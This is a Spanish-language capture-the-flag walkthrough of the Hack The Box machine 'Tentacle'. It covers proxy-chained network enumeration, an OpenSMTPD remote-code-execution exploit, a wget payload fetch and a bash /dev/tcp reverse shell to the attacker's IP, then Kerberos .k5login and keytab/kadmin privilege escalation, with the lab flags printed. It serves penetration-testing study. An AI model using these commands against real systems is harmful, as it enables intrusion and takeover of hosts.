---
layout: post
title: Tentacle
date: 2023-01-18
description:
img:
fig-caption:
tags: [eCPPTv2, eCPTXv2, OSCP, OSEP, eWPT, eWPTXv2]
---
___

<center><img src="/writeups/assets/img/Tentacle-htb/Tentacle_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración DNS

* SQUID Proxy

* Enumeración WPAD

* Explotación SMTPD

* SSH con Kerberos

* Enumeración de Kerberos

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
sudo nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.224 -vvv
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-18 16:29 GMT
Initiating SYN Stealth Scan at 16:29
Scanning 10.10.10.224 [65535 ports]
Discovered open port 22/tcp on 10.10.10.224
Discovered open port 53/tcp on 10.10.10.224
Discovered open port 88/tcp on 10.10.10.224
Discovered open port 3128/tcp on 10.10.10.224
Completed SYN Stealth Scan at 16:29, 39.54s elapsed (65535 total ports)
Nmap scan report for 10.10.10.224
Host is up, received user-set (0.050s latency).
Scanned at 2023-01-18 16:29:16 GMT for 39s
Not shown: 65485 filtered tcp ports (no-response), 45 filtered tcp ports (admin-prohibited), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
22/tcp   open  ssh          syn-ack ttl 63
53/tcp   open  domain       syn-ack ttl 63
88/tcp   open  kerberos-sec syn-ack ttl 63
3128/tcp open  squid-http   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 39.62 seconds
           Raw packets sent: 196550 (8.648MB) | Rcvd: 51 (3.500KB)
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,53,88,3128 10.10.10.224 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-18 16:30 GMT
Nmap scan report for 10.10.10.224
Host is up (0.045s latency).

PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 8ddd1810e57bb0daa3fa1437a7527a9c (RSA)
|   256 f6a92e57f818b6f4ee0341271e1f9399 (ECDSA)
|_  256 0474dd6879f42278d8cedd8b3e8c763b (ED25519)
53/tcp   open  domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
| dns-nsid: 
|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
88/tcp   open  kerberos-sec MIT Kerberos (server time: 2023-01-18 16:30:56Z)
3128/tcp open  http-proxy   Squid http proxy 4.11
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.11
Service Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.12 seconds

```

Nmap reporta un dominio, por lo que para que resuelva, lo añado al etc/hosts

```null
echo '10.10.10.224 REALCORP.HTB' >> /etc/hosts
```

## Puerto 53 (DNS)

Se puede tratar de efectuar un ataque de transferencia de zona (axfr), así como enumerar mail servers y servidores dns

Para ello se puede utilizar la herramienta dig

### AXFR

```null
dig @10.10.10.224 realcorp.htb axfr

; <<>> DiG 9.18.8-1-Debian <<>> @10.10.10.224 realcorp.htb axfr
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

### MS

```null
dig @10.10.10.224 realcorp.htb ms

; <<>> DiG 9.18.8-1-Debian <<>> @10.10.10.224 realcorp.htb ms
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 18479
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: c264233f5559a245e84bff4e63c81feda821374cc8ffa636 (good)
;; QUESTION SECTION:
;realcorp.htb.			IN	A

;; AUTHORITY SECTION:
realcorp.htb.		86400	IN	SOA	realcorp.htb. root.realcorp.htb. 199609206 28800 7200 2419200 86400

;; Query time: 47 msec
;; SERVER: 10.10.10.224#53(10.10.10.224) (UDP)
;; WHEN: Wed Jan 18 16:35:57 GMT 2023
;; MSG SIZE  rcvd: 110

;; communications error to 10.10.10.224#53: timed out
;; communications error to 10.10.10.224#53: timed out
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 974
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: c264233f5559a2458be7d8cd63c81ff7ea551af9954b1dd7 (good)
;; QUESTION SECTION:
;ms.				IN	A

;; Query time: 43 msec
;; SERVER: 10.10.10.224#53(10.10.10.224) (UDP)
;; WHEN: Wed Jan 18 16:36:07 GMT 2023
;; MSG SIZE  rcvd: 59
```

### NS

```null
dig @10.10.10.224 realcorp.htb ns

; <<>> DiG 9.18.8-1-Debian <<>> @10.10.10.224 realcorp.htb ns
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 54913
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: b4a50cfa749d210cc2f9e4bb63c8200689e3738796610904 (good)
;; QUESTION SECTION:
;realcorp.htb.			IN	NS

;; ANSWER SECTION:
realcorp.htb.		259200	IN	NS	ns.realcorp.htb.

;; ADDITIONAL SECTION:
ns.realcorp.htb.	259200	IN	A	10.197.243.77

;; Query time: 47 msec
;; SERVER: 10.10.10.224#53(10.10.10.224) (UDP)
;; WHEN: Wed Jan 18 16:36:22 GMT 2023
;; MSG SIZE  rcvd: 102
```

Aquí se puede ver como hay un subdominio que no apunta a la IP de la máquina víctima si no a otra que no está en el mismo segmento, por lo que no tengo conectividad y no tiene sentido añadirla al /etc/hosts.

A parte de tramitar consultas DNS con dig, también es posible aplicar fuerza bruta con otras herramientas como dnsenum

```null
dnsenum --dnsserver 10.10.10.224 --threads 30 -f /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt realcorp.htb
dnsenum VERSION:1.2.6

-----   realcorp.htb   -----

Brute forcing with /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:
________________________________________________________________________________________________

ns.realcorp.htb.                         259200   IN    A        10.197.243.77
proxy.realcorp.htb.                      259200   IN    CNAME    ns.realcorp.htb.
ns.realcorp.htb.                         259200   IN    A        10.197.243.77
wpad.realcorp.htb.                       259200   IN    A        10.197.243.31
```

Estos subdominios con sus correspondientes IPs, los añado al /etc/hosts.

## Puerto 80

En la página web se puede observar un usuario y otro subdominio a través del error


<img src="/writeups/assets/img/Tentacle-htb/1.png" alt="">

Añado el subdominio srv01.realcorp.htb al /etc/hosts

## Puerto 3128

Corresponde a un SQUID Proxy, por lo que para pasar a través del mismo, se puede utilizar proxychains, y llegar a segmentos a los que de primeras no tendría acceso.

El archivo de configuración del proxychains (/etc/proxychains4.conf) debe contener unicamente el siguiente proxy:

```null
http 10.10.10.224 3128
```

Al escanear los puertos locales pasando por el proxy definido, se puede tratar de comunicar a servicios a los que de primeras no se tiene acceso


Al escanear los puertos de 10.197.243.77 no resuelve a nada. Pero como está involucrado un SQUID Proxy, se puede tratar de utilizar la propia interfaz interna del SQUID Proxy para llegar a comunicarse con ese equipo.


Por tanto, hay que añadir un nuevo procy al /etc/proxychains4.conf

```null
http 10.10.10.224 3128
http 127.0.0.1 3128
```

A la hora de escanear los puertos, utilizo un secuenciador y xargs con hilos para ganar agilidad, ya que si no se demora mucho tiempo.

```null
seq 1 65535 | xargs -P 200 -I {} proxychains nmap -p{} -sT -Pn -v -n 10.197.243.77 -vvv 2>/dev/null | grep "tcp open"
53/tcp open  domain  syn-ack
22/tcp open  ssh     syn-ack
88/tcp open  kerberos-sec syn-ack
464/tcp open  kpasswd5 syn-ack
749/tcp open  kerberos-adm syn-ack
3128/tcp open  squid-http syn-ack
```

Como con esta IP si que tengo conectividad a la hora de escanear los puertos pero con 10.197.243.31, añado otro proxy para pasar por la interfaz de esta última máquina y escanear nuevamente los puertos de 10.197.243.31

```null
http 10.10.10.224 3128
http 127.0.0.1 3128
http 10.197.243.77 3128
```

Y ahora si que nmap reporta los puertos

```null
seq 1 65535 | xargs -P 200 -I {} proxychains nmap -p{} -sT -Pn -v -n 10.197.243.31 -vvv 2>/dev/null | grep "tcp open"
22/tcp open  ssh     syn-ack
53/tcp open  domain  syn-ack
80/tcp open  http    syn-ack
88/tcp open  kerberos-sec syn-ack
464/tcp open  kpasswd5 syn-ack
749/tcp open  kerberos-adm syn-ack
3128/tcp open  squid-http syn-ack
```

Como tiene una página web, se puede tratar de ver su contenido

Pero no tengo acceso

```null
proxychains curl -s -X GET wpad.realcorp.htb 2>/dev/null| html2text
                          ****** 403 Forbidden ******
===============================================================================
                                 nginx/1.14.1
```

En Hacktricks, buscando por WPAD, contemplan una ruta que contiene un archivo de configuración.
Para más información haz click [aquí](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks#wpad)

Su contenido es el siguiente:

```null
 proxychains curl -s -X GET wpad.realcorp.htb/wpad.dat 2>/dev/null
function FindProxyForURL(url, host) {
    if (dnsDomainIs(host, "realcorp.htb"))
        return "DIRECT";
    if (isInNet(dnsResolve(host), "10.197.243.0", "255.255.255.0"))
        return "DIRECT"; 
    if (isInNet(dnsResolve(host), "10.241.251.0", "255.255.255.0"))
        return "DIRECT"; 
 
    return "PROXY proxy.realcorp.htb:3128";
}
```

En esa función de javascript se puede ver un nuevo segmento que no he enumerado el cual puede contemplar IPs con servicios vulnerables

Como con proxychains no se pueden lanzar trazas ICMP, con nmap voy a escanear unos pocos puertos de cada IP posible (almacenados en un fichero temporal). 

```null
for i in $(seq 1 255); do cat commonports | xargs -P 200 -I {} proxychains nmap -p{} -sT -Pn -v -n 10.241.251.$i -vvv 2>/dev/null | grep -A 4 "tcp open" | grep -vE "Read|Nmap|Starting"; done
22/tcp open  ssh     syn-ack

Scanning 10.241.251.1 [1 port]
--
88/tcp open  kerberos-sec syn-ack

25/tcp open  smtp    syn-ack

Scanning 10.241.251.113 [1 port]
```

En la IP 10.241.251.113 está el puerto 25 abierto, y nmap reporta que es smtp, pero para saber la versión y el servicio exacto, conviene lanzar unos scripts más específicos con nmap

```null
proxychains nmap -sCV -p25 10.241.251.113 -sT -Pn
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-18 18:18 GMT
Nmap scan report for 10.241.251.113
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    OpenSMTPD
| smtp-commands: smtp.realcorp.htb Hello nmap.scanme.org [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
Service Info: Host: smtp.realcorp.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.24 seconds
```

Buscando vulnerabilidades para OpenSMTPD encuentro lo siguiente:

```null
searchsploit opensmtpd
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
OpenSMTPD - MAIL FROM Remote Code Execution (Metasploit)                                                                                                                      | linux/remote/48038.rb
OpenSMTPD - OOB Read Local Privilege Escalation (Metasploit)                                                                                                                  | linux/local/48185.rb
OpenSMTPD 6.4.0 < 6.6.1 - Local Privilege Escalation + Remote Code Execution                                                                                                  | openbsd/remote/48051.pl
OpenSMTPD 6.6.1 - Remote Code Execution                                                                                                                                       | linux/remote/47984.py
OpenSMTPD 6.6.3 - Arbitrary File Read                                                                                                                                         | linux/remote/48139.c
OpenSMTPD < 6.6.3p1 - Local Privilege Escalation + Remote Code Execution                                                                                                      | openbsd/remote/48140.c
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Como la versión es la 2.0.0, en un principioo es vulnerable a una ejecución remota de comandos, así que descargo el exploit y lo examino

```null
searchsploit -m linux/remote/47984.py
mv 47984.py exploit.py
```

Si ejecuto el exploit y me pongo en escucha con netcat no recibo ninguna petición

```null
proxychains python3 exploit.py 10.241.251.113 25 'wget 10.10.14.6'
```

Esto se puede dar en muchas ocasiones, ya que el script está diseñado para un usuario específico, el cual puede que no exista y haya que modificarlo.

Volviendo al principio, había encontrado un usuario en la página web principal, j.nakazawa

Sustituyéndolo en el script:

<img src="/writeups/assets/img/Tentacle-htb/2.png" alt="">

Ahora ya si funciona y recibo la petición en mi equipo

```null
nc -nlvp 80
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.224.
Ncat: Connection from 10.10.10.224:60886.
GET / HTTP/1.1
User-Agent: Wget/1.20.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.10.14.6
Connection: Keep-Alive
```

Para ganar acceso al sistema, basta con enviar una reverse shell con bash. Para ello hay que crear un archivo index.html con el siguiente contenido y hostearlo con python

```null
cat index.html
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'


python3 -m http.server 80
```

```null
proxychains python3 exploit.py 10.241.251.113 25 'wget 10.10.14.6 -O /dev/shm/revshell'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
❯ proxychains python3 exploit.py 10.241.251.113 25 'bash /dev/shm/revshell'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```

Y obtengo la shell

```null
nc -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.224.
Ncat: Connection from 10.10.10.224:34084.
bash: cannot set terminal process group (90): Inappropriate ioctl for device
bash: no job control in this shell
root@smtp:~# 
```

Tratamiento de la TTY

```null
root@smtp:~# script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
root@smtp:~# ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
root@smtp:~# export TERM=xterm
root@smtp:~# export SHELL=bash
```

Esta máquina no es la final, por lo que hay que aplicar pivoting

```null
root@smtp:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: eth0@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 0a:14:f8:9e:1f:33 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.241.251.113/24 brd 10.241.251.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::814:f8ff:fe9e:1f33/64 scope link 
       valid_lft forever preferred_lft forever
```

En el directo de j.nakazawa hay un archivo con credenciales en texto claro

```null
root@smtp:/home/j.nakazawa# cat .msmtprc 
# Set default values for all following accounts.
defaults
auth           on
tls            on
tls_trust_file /etc/ssl/certs/ca-certificates.crt
logfile        /dev/null

# RealCorp Mail
account        realcorp
host           127.0.0.1
port           587
from           j.nakazawa@realcorp.htb
user           j.nakazawa
password       sJB}RM>6Z~64_
tls_fingerprint	C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60

# Set a default account
account default : realcorp
```

Como el ssh está abierto en la máquina víctima se puede tratar de ganar acceso al sistema

De momento no se puede, pero a hay a destacar un error

```null
ssh j.nakazawa@10.10.10.224
The authenticity of host '10.10.10.224 (10.10.10.224)' can't be established.
ED25519 key fingerprint is SHA256:jU/fBtt04OZczha/InvaZgDCZKbuGDpHT2AzRKxsesg.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.224' (ED25519) to the list of known hosts.
j.nakazawa@10.10.10.224's password: 
Permission denied, please try again.
j.nakazawa@10.10.10.224's password: 
Permission denied, please try again.
j.nakazawa@10.10.10.224's password: 
j.nakazawa@10.10.10.224: Permission denied (gssapi-keyex,gssapi-with-mic,password).
```

Hace referencia a una autenticación por kerberos, por lo que hay que crear un archivo de configuración que tengo que crear y para poder autenticarme.

Para crear el archivo, basta con ejecutar lo siguiente:

```null
dpkg-reconfigure krb5-config
```

Se abrirá una interfaz gráfica donde hay que indicar el reino predeterminado de la versión 5 de Kerberos. En este caso REALCORP.HTB, importante que esté en mayusculas, es case-sensitive

<img src="/writeups/assets/img/Tentacle-htb/3.png" alt="">

En la siguiente pantalla habrá que decir que si quiero indicar la IP

<img src="/writeups/assets/img/Tentacle-htb/4.png" alt="">

En ambos casos hay que poner la de la máquina a la que me voy a conectar por ssh

<img src="/writeups/assets/img/Tentacle-htb/5.png" alt="">

<img src="/writeups/assets/img/Tentacle-htb/6.png" alt="">

Hay que modificar el fichero /etc/krb5.conf para que valga lo siguiente:

```null
[libdefaults]
  default_realm = REALCORP.HTB

[realms]
  REALCORP.HTB = {
    kdc = realcorp.htb:88
    }
```

Además, Kerberos es muy especial para el tema de la resolución DNS, por lo que hay que volver a modificar el fichero /etc/hosts para que el SPN sea el primero al que se hace referencia (He tardado casi 2 horas en llegar a esa conclusión)

```null
10.10.10.224 srv01.realcorp.htb realcorp.htb root.realcorp.htb
```

Después creo un TGT para poder autenticarme a la máquina

```null
kinit j.nakazawa
Password for j.nakazawa@REALCORP.HTB:
```

Y finalmente gano acceso

```null
ssh j.nakazawa@10.10.10.224
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Thu Jan 19 12:36:51 2023 from 10.10.14.6
[j.nakazawa@srv01 ~]$ 
```

Se puede visualizar la primera flag

```null
[j.nakazawa@srv01 ~]$ ls
user.txt
[j.nakazawa@srv01 ~]$ cat user.txt 
8cc1733bc02dba19f70e39fc699f927d
```

# Escalada

En las tareas CRON, hay un script en bash que ejecuta el usuario admin cada minuto


```null
[j.nakazawa@srv01 ~]$ cat /etc/crontab 
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
* * * * * admin /usr/local/bin/log_backup.sh
```

El script contiene lo siguiente

```null
[j.nakazawa@srv01 ~]$ cat /usr/local/bin/log_backup.sh
#!/bin/bash

/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
cd /home/admin
/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
/usr/bin/rm -f access.log cache.log
```

Se encarga de traer todo lo que haya en el directorio /var/log/squid/ al /home/admin/

Como pertenezco al grupo squid, puedo agregar contenido, pero no listarlo

```null
[j.nakazawa@srv01 home]$ id
uid=1000(j.nakazawa) gid=1000(j.nakazawa) groups=1000(j.nakazawa),23(squid),100(users) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

[j.nakazawa@srv01 home]$ ls -l /var/log/ | grep squid
drwx-wx---. 2 admin  squid      41 Dec 24  2020 squid
```

Como se emplea kerberos por detrás, estaría interesante tratar de agregar un archivo .k5login, ya que ahí se pueden asignar los principals (usuarios) a los que se le quiere dar acceso

Para conocer más sobre la estructura de estos archivos, haz click [aquí](https://web.mit.edu/kerberos/krb5-devel/doc/user/user_config/k5login.html)

Si me intento conectar como el usuario admin por ssh me pide contraseña, la cual desconozco y además está deshabilitada la autenticación por ese método

```null
ssh admin@10.10.10.224
admin@10.10.10.224's password: 
```

Si añado el principal de j.nakazawa al .k5login, ya no me tendré que autenticar ya que estoy arrastrando su TGT creado anteriormente

```null
[j.nakazawa@srv01 squid]$ echo 'j.nakazawa@REALCORP.HTB' > .k5login
```

Y gano acceso como admin

```null
ssh admin@10.10.10.224
Activate the web console with: systemctl enable --now cockpit.socket

Last failed login: Thu Jan 19 13:11:15 GMT 2023 from 10.10.10.224 on ssh:notty
There were 2 failed login attempts since the last successful login.
Last login: Thu Jan 19 13:11:01 2023
[admin@srv01 ~]$ 
```

Buscando por archivos cuyo grupo sea admin, aparecen ficheros de configuración de Kerberos

```null
[admin@srv01 /]$ find / -type f -group admin 2>/dev/null | grep -vE "proc|cgroup"
/home/admin/squid_logs.tar.gz.2023-01-19-131301
/home/admin/squid_logs.tar.gz.2023-01-19-131401
/usr/local/bin/log_backup.sh
/etc/krb5.keytab
```

Los archivos .keytab de Kerberos, se utilizan para autenticarse contra el KDC

En este [POC](https://web.mit.edu/kerberos/krb5-1.4/krb5-1.4.2/doc/krb5-install/The-Keytab-File.html) explican como es posible escalar privilegios en caso de que tenga capacidad de lectura y el propietario sea otro distinto de root.

Si busco por TGTs almacenados en la caché en principio no encuentra ninguno

```null
[admin@srv01 /]$ klist
klist: Credentials cache 'KCM:1011' not found
```

Pero si especifico el archivo .keytab al que tengo acceso puedo ver algunos principals

```null
[admin@srv01 /]$ klist -k /etc/krb5.keytab
Keytab name: FILE:/etc/krb5.keytab
KVNO Principal
---- --------------------------------------------------------------------------
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
```

Con kadmin, me autentico al KDC y obtengo una sesión interactiva y utilizando el principal de kadmin

```null
kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
Couldn't open log file /var/log/kadmind.log: Permission denied
Authenticating as principal kadmin/admin@REALCORP.HTB with keytab /etc/krb5.keytab.
kadmin: 
```

Como estoy autenticado, puedo crear un principal para el usuario root y setearle una contraseña, la que quiera

```null
kadmin:  add_principal root@REALCORP.HTB
No policy specified for root@REALCORP.HTB; defaulting to no policy
Enter password for principal "root@REALCORP.HTB": 
Re-enter password for principal "root@REALCORP.HTB": 
Principal "root@REALCORP.HTB" created.
```

Una vez creado cierro la sesión y me autentico como root por kerberos

```null
[admin@srv01 /]$ ksu
WARNING: Your password may be exposed if you enter it here and are logged 
         in remotely using an unsecure (non-encrypted) channel. 
Kerberos password for root@REALCORP.HTB: : 
Authenticated root@REALCORP.HTB
Account root: authorization for root@REALCORP.HTB successful
Changing uid to root (0)
```

Y puedo visualizar la flag

```null
[root@srv01 /]# cat /root/root.txt
f974380b776a91dbce5b1b07f70697e8
```